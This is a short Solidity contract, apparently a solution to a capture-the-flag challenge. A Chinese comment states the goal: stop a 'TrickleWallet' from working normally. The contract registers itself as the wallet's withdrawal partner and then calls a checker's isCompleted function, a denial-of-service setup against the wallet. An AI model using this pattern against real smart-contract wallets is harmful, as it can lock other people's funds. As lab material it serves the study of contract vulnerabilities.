pragma solidity ^0.4.0;
// 想办法让这个Wallet停止工作（无法正常存取）
import "./1.sol";
contract Attract{
    Check check;
    address public a;
    constructor(Check addr) public {
        check = addr;
        a = address(check.wallet());
    }
    function attract() payable public {
        TrickleWallet(a).setWithdrawPartner(address(this));
        check.isCompleted();
    }
}